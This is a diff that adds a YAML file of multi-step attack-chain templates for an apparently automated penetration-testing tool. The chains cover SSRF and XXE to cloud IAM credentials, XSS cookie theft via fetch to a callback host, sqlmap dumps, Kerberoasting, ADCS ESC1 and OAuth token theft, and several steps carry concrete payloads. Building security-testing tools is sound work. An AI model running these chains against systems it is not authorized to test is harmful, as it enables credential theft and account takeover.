@@ -1,0 +1,199 @@
+# Pencheff deterministic attack-chain templates.
+#
+# Each chain encodes a multi-step exploitation pattern that is publicly
+# documented (OWASP / PortSwigger / vendor advisories). The ChainPlanner
+# walks current findings; when all preconditions are present in the session,
+# the chain is queued as a candidate for the EXPLOIT phase.
+#
+# Sources cited per chain. No third-party orchestrator's source consulted.
+
+version: 1
+
+chains:
+
+  # ─── SSRF → cloud metadata → IAM creds → S3 dump ───
+  # source: PortSwigger "Server-side request forgery" academy module;
+  # AWS docs: "Instance metadata service".
+  - id: ssrf_to_iam
+    name: "SSRF → IAM credential exfiltration"
+    severity: critical
+    preconditions:
+      - finding_type: ssrf
+    steps:
+      - { action: probe_metadata,    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
+      - { action: extract_role_name, parser: aws_metadata_role }
+      - { action: fetch_credentials, payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}" }
+      - { action: enumerate_s3,      using: aws_creds }
+    postcondition_type: cloud_credential_theft
+
+  # ─── XSS reflected → cookie steal → session hijack ───
+  # source: OWASP XSS prevention cheat-sheet; PortSwigger DOM XSS labs.
+  - id: xss_session_hijack
+    name: "Reflected XSS → cookie exfiltration → session hijack"
+    severity: high
+    preconditions:
+      - finding_type: xss_reflected
+        attribute: cookie_accessible
+    steps:
+      - { action: build_payload, template: "<script>fetch('{oast}/?c='+document.cookie)</script>" }
+      - { action: deliver,        via: target_response }
+      - { action: collect,        from: oast }
+      - { action: replay_request, with: stolen_cookie }
+    postcondition_type: session_hijack
+
+  # ─── SQLi (error-based) → schema dump → admin creds → admin login ───
+  # source: OWASP SQL Injection guide; sqlmap docs.
+  - id: sqli_admin_takeover
+    name: "Error-based SQLi → schema dump → admin password hash → login"
+    severity: critical
+    preconditions:
+      - finding_type: sqli_error_based
+    steps:
+      - { action: dump_schema,        tool: sqlmap, args: ["--dbs"] }
+      - { action: dump_users_table,   tool: sqlmap, args: ["-D", "{db}", "-T", "users", "--dump"] }
+      - { action: crack_hashes,       tool: hashcat }
+      - { action: try_login,          ratelimit: 1.0 }
+    postcondition_type: admin_takeover
+
+  # ─── IDOR → user enum → admin lookup → privilege escalation ───
+  # source: OWASP "Authorization Testing" WSTG-ATHZ-04.
+  - id: idor_privesc
+    name: "IDOR user-id → enumeration → admin discovery → privilege escalation"
+    severity: high
+    preconditions:
+      - finding_type: idor
+        attribute: numeric_id
+    steps:
+      - { action: enumerate_ids,    range: "1..1000" }
+      - { action: filter_admins,    by: role_field }
+      - { action: pivot_session,    to: admin_id }
+    postcondition_type: privilege_escalation
+
+  # ─── Open redirect → OAuth redirect_uri abuse → token theft ───
+  # source: PortSwigger "OAuth 2.0" academy; RFC 6819.
+  - id: oauth_takeover
+    name: "Open redirect → OAuth redirect_uri abuse → access-token theft"
+    severity: critical
+    preconditions:
+      - finding_type: open_redirect
+      - finding_type: oauth_endpoint_present
+    steps:
+      - { action: craft_authorize_url, params: { redirect_uri: "{attacker}" } }
+      - { action: deliver_url,         via: phishing_template }
+      - { action: collect_token,       from: oast }
+    postcondition_type: account_takeover
+
+  # ─── Subdomain takeover → cookie scope abuse → session hijack ───
+  # source: HackerOne "Subdomain takeover" disclosure series.
+  - id: subdomain_takeover_chain
+    name: "Subdomain takeover → cookie scope abuse → session hijack"
+    severity: high
+    preconditions:
+      - finding_type: subdomain_takeover
+      - finding_type: cookie_parent_domain_scope
+    steps:
+      - { action: claim_orphan_resource }
+      - { action: serve_payload,    payload_template: oauth_token_collector }
+      - { action: collect,          from: oast }
+    postcondition_type: session_hijack
+
+  # ─── XXE → SSRF → cloud creds ───
+  # source: OWASP XXE Prevention cheat-sheet.
+  - id: xxe_to_iam
+    name: "XXE external entity → SSRF → cloud metadata"
+    severity: critical
+    preconditions:
+      - finding_type: xxe
+    steps:
+      - { action: build_xxe_payload, template: "<!DOCTYPE x[<!ENTITY e SYSTEM '{metadata}'>]><x>&e;</x>" }
+      - { action: extract_response, parser: aws_metadata_role }
+      - { action: pivot_to,         chain: ssrf_to_iam }
+    postcondition_type: cloud_credential_theft
+
+  # ─── Deserialization RCE → reverse shell → host enum ───
+  # source: OWASP "Deserialization Cheat Sheet"; ysoserial README.
+  - id: deser_to_rce
+    name: "Insecure deserialization → RCE → reverse shell"
+    severity: critical
+    preconditions:
+      - finding_type: insecure_deserialization
+    steps:
+      - { action: generate_gadget,   tool: ysoserial }
+      - { action: deliver,           via: target_endpoint }
+      - { action: confirm_callback,  from: oast }
+    postcondition_type: rce
+
+  # ─── HTTP smuggling → cache poison → mass session hijack ───
+  # source: PortSwigger "HTTP request smuggling" research.
+  - id: smuggling_cache_poison
+    name: "Request smuggling → cache poisoning → mass session hijack"
+    severity: critical
+    preconditions:
+      - finding_type: http_smuggling
+    steps:
+      - { action: craft_smuggled_request, technique: "CL.TE" }
+      - { action: poison_response_cache,  payload_template: cookie_collector }
+      - { action: monitor_oast }
+    postcondition_type: mass_compromise
+
+  # ─── Kerberoasting → offline crack → DA login ───
+  # source: SpecterOps "Kerberoasting Revisited"; MS-PAC docs.
+  - id: kerberoast_chain
+    name: "Kerberoast SPNs → offline crack → privileged account login"
+    severity: critical
+    preconditions:
+      - finding_type: kerberoastable_spn
+    steps:
+      - { action: request_tgs,    tool: impacket-getuserspns }
+      - { action: crack_offline,  tool: hashcat, mode: "13100" }
+      - { action: validate_login, tool: netexec }
+    postcondition_type: domain_admin
+
+  # ─── AS-REP roasting → offline crack → user takeover ───
+  # source: ADSecurity "AS-REP Roasting" article.
+  - id: asrep_chain
+    name: "AS-REP roast → offline crack → user account compromise"
+    severity: high
+    preconditions:
+      - finding_type: asrep_roastable_user
+    steps:
+      - { action: request_asrep,  tool: impacket-getnpusers }
+      - { action: crack_offline,  tool: hashcat, mode: "18200" }
+    postcondition_type: user_takeover
+
+  # ─── ADCS ESC1 → cert request → DA impersonation ───
+  # source: SpecterOps "Certified Pre-Owned" white paper.
+  - id: adcs_esc1
+    name: "ADCS ESC1 → cert template abuse → privileged impersonation"
+    severity: critical
+    preconditions:
+      - finding_type: adcs_esc1_template
+    steps:
+      - { action: request_cert,    tool: certipy, args: ["req", "--upn", "{victim}"] }
+      - { action: pkinit_login,    tool: certipy, args: ["auth"] }
+    postcondition_type: domain_admin
+
+  # ─── Mass-assignment → role bump → privilege escalation ───
+  # source: OWASP API Security Top 10 (API6:2023 "Unrestricted Access...").
+  - id: mass_assignment_privesc
+    name: "Mass assignment → role/admin field bump → privilege escalation"
+    severity: high
+    preconditions:
+      - finding_type: mass_assignment_candidate
+    steps:
+      - { action: probe_field,    candidates: ["role", "is_admin", "isAdmin", "admin", "permissions"] }
+      - { action: replay_with_admin_field }
+    postcondition_type: privilege_escalation
+
+  # ─── Server-side prototype pollution → auth bypass ───
+  # source: PortSwigger "Server-side prototype pollution" research.
+  - id: ssrf_proto_to_authbypass
+    name: "Server-side prototype pollution → auth bypass"
+    severity: critical
+    preconditions:
+      - finding_type: prototype_pollution_server
+    steps:
+      - { action: probe_pollution_sink }
+      - { action: pollute_auth_bypass_property }
+      - { action: replay_authenticated_request }
+    postcondition_type: privilege_escalation
